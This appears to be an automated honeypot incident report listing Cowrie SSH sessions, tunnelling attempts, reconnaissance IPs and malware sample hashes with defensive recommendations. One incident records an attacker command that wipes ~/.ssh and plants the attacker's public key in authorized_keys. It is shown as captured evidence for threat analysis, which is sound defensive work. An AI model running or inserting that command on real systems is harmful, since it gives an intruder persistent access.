### 🔴 HIGH · IR-71a81149f952

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-28 18:03 |
| **Last Seen** | 2026-07-28 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:03:22` | `cowrie.session.connect` |
| `2026-07-28 18:03:23` | `cowrie.client.version` |
| `2026-07-28 18:03:23` | `cowrie.client.kex` |
| `2026-07-28 18:03:25` | `cowrie.login.success` |
| `2026-07-28 18:03:26` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:03:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b0cc9e615e

| Field | Detail |
|---|---|
| **Source IP** | `218.202.143[.]68` |
| **First Seen** | 2026-07-28 18:03 |
| **Last Seen** | 2026-07-28 18:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:03:31` | `cowrie.session.connect` |
| `2026-07-28 18:03:32` | `cowrie.client.version` |
| `2026-07-28 18:03:32` | `cowrie.client.kex` |
| `2026-07-28 18:03:34` | `cowrie.login.success` |
| `2026-07-28 18:03:35` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.202.143[.]68` to AbuseIPDB if not already reported
- [ ] Block `218.202.143[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802145ba36c2

| Field | Detail |
|---|---|
| **Source IP** | `118.196.118[.]181` |
| **First Seen** | 2026-07-28 18:07 |
| **Last Seen** | 2026-07-28 18:12 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:07:46` | `cowrie.session.connect` |
| `2026-07-28 18:07:46` | `cowrie.client.version` |
| `2026-07-28 18:07:46` | `cowrie.client.kex` |
| `2026-07-28 18:07:47` | `cowrie.login.success` |
| `2026-07-28 18:07:47` | `cowrie.session.params` |
| `2026-07-28 18:07:47` | `cowrie.command.input` |
| `2026-07-28 18:07:47` | `cowrie.command.failed` |
| `2026-07-28 18:07:48` | `cowrie.log.closed` |
| `2026-07-28 18:07:49` | `cowrie.session.params` |
| `2026-07-28 18:07:49` | `cowrie.command.input` |
| `2026-07-28 18:07:49` | `cowrie.session.file_download` |
| `2026-07-28 18:07:49` | `cowrie.log.closed` |
| `2026-07-28 18:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.118[.]181` to AbuseIPDB if not already reported
- [ ] Block `118.196.118[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1c5aaa2e88b

| Field | Detail |
|---|---|
| **Source IP** | `180.180.232[.]242` |
| **First Seen** | 2026-07-28 18:11 |
| **Last Seen** | 2026-07-28 18:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:11:16` | `cowrie.session.connect` |
| `2026-07-28 18:11:17` | `cowrie.client.version` |
| `2026-07-28 18:11:17` | `cowrie.client.kex` |
| `2026-07-28 18:11:18` | `cowrie.login.success` |
| `2026-07-28 18:11:19` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.180.232[.]242` to AbuseIPDB if not already reported
- [ ] Block `180.180.232[.]242` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6827235766a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 18:16 |
| **Last Seen** | 2026-07-28 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:16:27` | `cowrie.session.connect` |
| `2026-07-28 18:16:27` | `cowrie.client.version` |
| `2026-07-28 18:16:27` | `cowrie.client.kex` |
| `2026-07-28 18:16:27` | `cowrie.login.success` |
| `2026-07-28 18:16:27` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:16:28` | `cowrie.direct-tcpip.data` |
| `2026-07-28 18:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3ce819c2bf

| Field | Detail |
|---|---|
| **Source IP** | `111.42.175[.]101` |
| **First Seen** | 2026-07-28 18:25 |
| **Last Seen** | 2026-07-28 18:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:25:46` | `cowrie.session.connect` |
| `2026-07-28 18:25:47` | `cowrie.client.version` |
| `2026-07-28 18:25:47` | `cowrie.client.kex` |
| `2026-07-28 18:25:50` | `cowrie.login.success` |
| `2026-07-28 18:25:50` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.175[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.42.175[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ade7a657452

| Field | Detail |
|---|---|
| **Source IP** | `2.55.122[.]202` |
| **First Seen** | 2026-07-28 18:27 |
| **Last Seen** | 2026-07-28 18:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:27:41` | `cowrie.session.connect` |
| `2026-07-28 18:27:41` | `cowrie.client.version` |
| `2026-07-28 18:27:41` | `cowrie.client.kex` |
| `2026-07-28 18:27:43` | `cowrie.login.success` |
| `2026-07-28 18:27:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.122[.]202` to AbuseIPDB if not already reported
- [ ] Block `2.55.122[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ad66b74e76

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-07-28 18:27 |
| **Last Seen** | 2026-07-28 18:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:27:48` | `cowrie.session.connect` |
| `2026-07-28 18:27:48` | `cowrie.client.version` |
| `2026-07-28 18:27:48` | `cowrie.client.kex` |
| `2026-07-28 18:27:50` | `cowrie.login.success` |
| `2026-07-28 18:27:50` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1404601fd26

| Field | Detail |
|---|---|
| **Source IP** | `106.89.60[.]3` |
| **First Seen** | 2026-07-28 18:35 |
| **Last Seen** | 2026-07-28 18:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:35:40` | `cowrie.session.connect` |
| `2026-07-28 18:35:41` | `cowrie.client.version` |
| `2026-07-28 18:35:41` | `cowrie.client.kex` |
| `2026-07-28 18:35:43` | `cowrie.login.success` |
| `2026-07-28 18:35:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.60[.]3` to AbuseIPDB if not already reported
- [ ] Block `106.89.60[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6686715522dc

| Field | Detail |
|---|---|
| **Source IP** | `42.200.60[.]186` |
| **First Seen** | 2026-07-28 18:35 |
| **Last Seen** | 2026-07-28 18:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:35:49` | `cowrie.session.connect` |
| `2026-07-28 18:35:50` | `cowrie.client.version` |
| `2026-07-28 18:35:50` | `cowrie.client.kex` |
| `2026-07-28 18:35:53` | `cowrie.login.success` |
| `2026-07-28 18:35:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:35:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.60[.]186` to AbuseIPDB if not already reported
- [ ] Block `42.200.60[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a49c064cff9

| Field | Detail |
|---|---|
| **Source IP** | `122.117.30[.]20` |
| **First Seen** | 2026-07-28 18:39 |
| **Last Seen** | 2026-07-28 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:39:06` | `cowrie.session.connect` |
| `2026-07-28 18:39:07` | `cowrie.client.version` |
| `2026-07-28 18:39:07` | `cowrie.client.kex` |
| `2026-07-28 18:39:09` | `cowrie.login.success` |
| `2026-07-28 18:39:10` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.117.30[.]20` to AbuseIPDB if not already reported
- [ ] Block `122.117.30[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7526dc6c648f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:05` | `cowrie.session.connect` |
| `2026-07-28 18:48:05` | `cowrie.client.version` |
| `2026-07-28 18:48:05` | `cowrie.client.kex` |
| `2026-07-28 18:48:05` | `cowrie.login.success` |
| `2026-07-28 18:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5afd10a5982

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:05` | `cowrie.session.connect` |
| `2026-07-28 18:48:05` | `cowrie.client.version` |
| `2026-07-28 18:48:05` | `cowrie.client.kex` |
| `2026-07-28 18:48:05` | `cowrie.login.success` |
| `2026-07-28 18:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30df5c035e5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:11` | `cowrie.session.connect` |
| `2026-07-28 18:48:11` | `cowrie.client.version` |
| `2026-07-28 18:48:11` | `cowrie.client.kex` |
| `2026-07-28 18:48:11` | `cowrie.login.success` |
| `2026-07-28 18:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bffa1125285a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:11` | `cowrie.session.connect` |
| `2026-07-28 18:48:11` | `cowrie.client.version` |
| `2026-07-28 18:48:11` | `cowrie.client.kex` |
| `2026-07-28 18:48:11` | `cowrie.login.success` |
| `2026-07-28 18:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebde466d1c25

| Field | Detail |
|---|---|
| **Source IP** | `111.70.14[.]135` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:36` | `cowrie.session.connect` |
| `2026-07-28 18:48:36` | `cowrie.client.version` |
| `2026-07-28 18:48:36` | `cowrie.client.kex` |
| `2026-07-28 18:48:38` | `cowrie.login.success` |
| `2026-07-28 18:48:39` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.14[.]135` to AbuseIPDB if not already reported
- [ ] Block `111.70.14[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27d7f0abd05f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-28 18:48 |
| **Last Seen** | 2026-07-28 18:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:48:44` | `cowrie.session.connect` |
| `2026-07-28 18:48:45` | `cowrie.client.version` |
| `2026-07-28 18:48:45` | `cowrie.client.kex` |
| `2026-07-28 18:48:46` | `cowrie.login.success` |
| `2026-07-28 18:48:46` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b686dc4b8638

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-07-28 18:49 |
| **Last Seen** | 2026-07-28 18:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:49:53` | `cowrie.session.connect` |
| `2026-07-28 18:49:54` | `cowrie.client.version` |
| `2026-07-28 18:49:54` | `cowrie.client.kex` |
| `2026-07-28 18:49:57` | `cowrie.login.success` |
| `2026-07-28 18:49:57` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17209ce236e8

| Field | Detail |
|---|---|
| **Source IP** | `179.189.85[.]66` |
| **First Seen** | 2026-07-28 18:51 |
| **Last Seen** | 2026-07-28 18:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:51:59` | `cowrie.session.connect` |
| `2026-07-28 18:51:59` | `cowrie.client.version` |
| `2026-07-28 18:51:59` | `cowrie.client.kex` |
| `2026-07-28 18:52:01` | `cowrie.login.success` |
| `2026-07-28 18:52:02` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.189.85[.]66` to AbuseIPDB if not already reported
- [ ] Block `179.189.85[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc05227e18a

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-28 18:52 |
| **Last Seen** | 2026-07-28 18:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 18:52:07` | `cowrie.session.connect` |
| `2026-07-28 18:52:07` | `cowrie.client.version` |
| `2026-07-28 18:52:07` | `cowrie.client.kex` |
| `2026-07-28 18:52:09` | `cowrie.login.success` |
| `2026-07-28 18:52:10` | `cowrie.direct-tcpip.request` |
| `2026-07-28 18:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **27** | 2026-07-28 17:01 | 2026-07-28 18:54 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-28 17:01 | 2026-07-28 18:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]121` | **3** | 2026-07-28 18:21 | 2026-07-28 18:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-28 17:49 | 2026-07-28 17:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]86` | **3** | 2026-07-28 17:06 | 2026-07-28 17:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-28 16:55 | 2026-07-28 16:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]218` | **2** | 2026-07-28 18:28 | 2026-07-28 18:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-07-28 18:44 | 2026-07-28 18:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.119.43[.]103` | **2** | 2026-07-28 17:44 | 2026-07-28 17:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-07-28 18:14 | 2026-07-28 18:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.70[.]73` | 1 | 2026-07-28 18:11 | 2026-07-28 18:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.47.65[.]219` | 1 | 2026-07-28 17:25 | 2026-07-28 17:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.118[.]181` | 1 | 2026-07-28 18:07 | 2026-07-28 18:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-28 17:31 | 2026-07-28 17:31 | 3s | 0 | `T1592` | 🟢 LOW |
| `165.22.70[.]229` | 1 | 2026-07-28 17:06 | 2026-07-28 17:06 | 20s | 0 | `T1592` | 🟢 LOW |
| `183.171.237[.]250` | 1 | 2026-07-28 18:02 | 2026-07-28 18:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `60.214.154[.]254` | 1 | 2026-07-28 18:34 | 2026-07-28 18:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.145.163[.]164` | 1 | 2026-07-28 17:12 | 2026-07-28 17:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-28 18:38 | 2026-07-28 18:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.236.211[.]54` | 1 | 2026-07-28 18:24 | 2026-07-28 18:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]9` | 1 | 2026-07-28 18:14 | 2026-07-28 18:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 82/100 | 🔴 HIGH | **32/74** 🔴 |
